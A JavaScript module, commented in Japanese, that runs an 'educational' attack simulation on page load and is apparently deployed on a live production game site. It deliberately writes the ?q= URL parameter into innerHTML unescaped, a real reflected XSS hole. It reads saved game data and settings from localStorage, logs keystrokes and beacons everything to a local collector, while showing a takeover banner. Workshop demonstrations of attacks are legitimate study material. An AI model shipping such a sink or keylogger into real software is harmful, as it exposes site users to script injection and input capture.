// 【本番組み込み・意図的】ページを開くと同時に走る攻撃（実際に動く）。
//
// 所有者の指示により、本番ページにそのまま組み込まれている。動くもの:
//
//  1) 反射型XSS（?q=）      — 本物のシンク。URL にペイロードを付けると本当に実行される
//  2) キーロガー            — 入力を記録し、10 キー/5 秒ごとにビーコン送信
//  3) セーブデータ・設定読み — 本物の localStorage（shibuya.save / shibuya.pad）を読む
//  4) 改ざん               — 赤いバナーと画面の減光で「攻撃されている状態」を可視化
//  5) 攻撃ログ             — DevTools コンソールと画面内ログパネルへ
//
// ビーコンの宛先は 127.0.0.1:9999（examples/security-workshop/attack-server.mjs の
// 収集サーバ）。動いていれば本当に受信される。動いていなくても送信自体は行われる
// （宛先がローカルなので実害なし）。外部への送信は一切ない。
//
// 無効化: ?attack=0（そのページ表示では何もしない）
// 停止  : バナーの「攻撃を終了する」ボタン（シンク・リスナー全解除）
//
// dispose(): 全リスナー・タイマー・DOM を解除。disposed 後のコールバックは
// 触れない（リザレクト禁止）。React effect と 1:1 で対応する。

const COLLECTOR = 'http://127.0.0.1:9999/collect';
const ROOT_ID = 'attack-sim-root';

export function startAttackSimulation() {
  const params = typeof location === 'undefined'
    ? new URLSearchParams()
    : new URLSearchParams(location.search);
  // ?attack=0 のときは完全にオフ（?q= のシンクも含めて何も設置しない）
  if (params.get('attack') === '0') return {dispose() {}};

  let disposed = false;
  let stopped = false;
  const teardowns = [];
  /** 解除用に登録。dispose 後の登録は即解除する（非同期後のリザレクト防止）。 */
  const on = (teardown) => { if (disposed) teardown(); else teardowns.push(teardown); };
  /** 全解除。stop と dispose から呼ばれる。 */
  const teardownAll = () => { while (teardowns.length) teardowns.pop()(); };

  // ---- スタイル: 画面全体を「攻撃されている」雰囲気にする ----
  const style = document.createElement('style');
  style.id = 'attack-sim-style';
  style.textContent = `
    #${ROOT_ID} { position:fixed; inset:0; z-index:2147483000; pointer-events:none; font-family:system-ui,sans-serif; }
    #${ROOT_ID} .as-vignette { position:absolute; inset:0; box-shadow:inset 0 0 140px rgba(255,40,40,.30); animation:as-pulse 2.2s ease-in-out infinite; }
    @keyframes as-pulse { 0%,100% {opacity:.55} 50% {opacity:1} }
    #${ROOT_ID} .as-banner { position:absolute; top:0; left:0; right:0;
      background:linear-gradient(90deg,#7a0d0d,#a31414); color:#ffe3e3;
      padding:10px 16px; font-size:14px; font-weight:700;
      display:flex; gap:14px; align-items:center; justify-content:center; flex-wrap:wrap; }
    #${ROOT_ID} .as-banner small { font-weight:400; opacity:.85; }
    #${ROOT_ID} .as-stop { pointer-events:auto; cursor:pointer; border:0; border-radius:6px;
      background:#ffe3e3; color:#7a0d0d; font-weight:700; padding:6px 14px; font-size:13px; }
    #${ROOT_ID} .as-log { position:absolute; right:14px; bottom:14px; width:min(380px,80vw);
      background:rgba(30,0,0,.85); border:1px solid #ff5d5d; border-radius:8px;
      color:#ffb3b3; font:12px/1.5 monospace; padding:10px 12px; }
    #${ROOT_ID} .as-log b { color:#ff8080; }
    #${ROOT_ID} .as-lines { margin-top:4px; max-height:10em; overflow:hidden; }
  `;
  document.head.appendChild(style);
  on(() => style.remove());

  // ---- UI: 改ざんバナー + 攻撃ログパネル（見た目は「乗っ取り」） ----
  const root = document.createElement('div');
  root.id = ROOT_ID;
  root.setAttribute('aria-label', '教育用攻撃シミュレーション');
  root.innerHTML =
    '<div class="as-vignette" aria-hidden="true"></div>' +
    '<div class="as-banner" role="alert">⚠ このサイトは攻撃されています <small>教育用ペネトレーション — 通信はローカル(127.0.0.1)宛のみ</small>' +
    '<button type="button" class="as-stop">攻撃を終了する</button></div>' +
    '<div class="as-log"><b>ATTACK LOG</b><div class="as-lines"></div></div>';
  document.body.appendChild(root);
  on(() => root.remove());

  const lines = root.querySelector('.as-lines');
  /** ログは textContent で書く。意図的に生で流すのは ?q= のシンクだけ。 */
  const log = (text) => {
    if (disposed || !lines) return;
    const row = document.createElement('div');
    row.textContent = `${new Date().toLocaleTimeString()}  ${text}`;
    lines.appendChild(row);
    while (lines.childElementCount > 8) lines.firstElementChild.remove();
  };
  console.warn('%c[ATTACK SIM] 攻撃者のペイロードが実行されました（教育用・宛先はローカルのみ）',
    'background:#7a0d0d;color:#ffe3e3;padding:2px 8px;font-weight:bold');

  // ---- 1) 反射型XSS: ?q= を本当に innerHTML へ（未エスケープのまま・意図的） ----
  const q = params.get('q');
  if (q !== null) {
    const sink = document.createElement('div');
    sink.id = 'attack-sim-sink';
    sink.style.cssText = 'position:fixed;left:12px;bottom:12px;z-index:2147483001;max-width:420px';
    document.body.appendChild(sink);
    sink.innerHTML = q; // ← 意図的に未エスケープ（本物の脆弱性。修正は所有者判断）
    on(() => sink.remove());
  }

  // ---- ビーコン: 盗んだデータを本物の HTTP で送る（宛先はローカル収集サーバ） ----
  const beacon = (data, via) => {
    try { new Image().src = `${COLLECTOR}?d=${encodeURIComponent(data)}&src=${via}`; } catch {}
  };

  // ---- 2) セーブデータ・設定の覗き見（本物の localStorage を読む） ----
  try {
    const raw = localStorage.getItem('shibuya.save');
    if (raw) {
      const s = JSON.parse(raw);
      const missions = s && s.completed ? Object.keys(s.completed).length : 0;
      log(`SAVE DATA READ: money=¥${s?.money ?? 0} missions=${missions}件`);
      beacon(`SAVE money=${s?.money ?? 0} missions=${missions}`, 'save');
    } else log('SAVE DATA READ: (セーブなし)');
  } catch { log('SAVE DATA READ: (読み取り失敗)'); }
  try {
    const pad = localStorage.getItem('shibuya.pad');
    if (pad) {
      const p = JSON.parse(pad);
      log(`SETTINGS READ: pad=[${Object.keys(p).join(',')}]`);
      beacon(`PADSETTINGS ${Object.keys(p).join(',')}`, 'settings');
    }
  } catch {}

  // ---- 3) キーロガー: 記録して 10 キーごとに送信 ----
  let keyBuf = [];
  const flushKeys = () => {
    if (!keyBuf.length) return;
    beacon(`KEYS:${keyBuf.join('')}`, 'keylogger');
    keyBuf = [];
  };
  const onKey = (e) => {
    if (disposed) return;
    keyBuf.push(e.key.length === 1 ? e.key : `<${e.key}>`);
    log(`KEYLOGGER 記録中: ${keyBuf.slice(-10).join(' ')}`);
    if (keyBuf.length >= 10) flushKeys();
  };
  document.addEventListener('keypress', onKey, true);
  const keyTimer = setInterval(flushKeys, 5000);
  on(() => { clearInterval(keyTimer); flushKeys(); document.removeEventListener('keypress', onKey, true); });

  // ---- 4) 定期攻撃ログ（雰囲気と DevTeaks での確認用） ----
  const taunts = [
    'payload executed via img onerror (scriptタグはinnerHTMLで動かない)',
    'your save data has been read',
    'keystrokes are being recorded',
    'data beacons to 127.0.0.1:9999 (workshop collector)',
  ];
  let taunt = 0;
  const tauntTimer = setInterval(() => { if (!disposed) log(`payload: ${taunts[taunt++ % taunts.length]}`); }, 4000);
  on(() => clearInterval(tauntTimer));

  // ---- 停止ボタン: 即座に全解除して元の表示に戻す ----
  const stopButton = root.querySelector('.as-stop');
  if (stopButton) stopButton.addEventListener('click', () => {
    stopped = true;
    disposed = true;      // 以後のログ/ビーコン/キー記録は無効
    flushKeys();          // 残ったキー入力も送ってから閉じる
    teardownAll();
    const toast = document.createElement('div');
    toast.textContent = '攻撃を終了しました（?attack=0 を付けると常にオフ）';
    toast.style.cssText = 'position:fixed;bottom:12px;left:12px;z-index:2147483001;background:#12352a;color:#b8ffd8;padding:10px 14px;border-radius:8px;font:13px/1.4 system-ui,sans-serif';
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 3500);
  });

  return {
    dispose() {
      if (stopped) return;   // ユーザが止めた後のアンマウントでは二重に何もしない
      disposed = true;
      teardownAll();
    },
  };
}
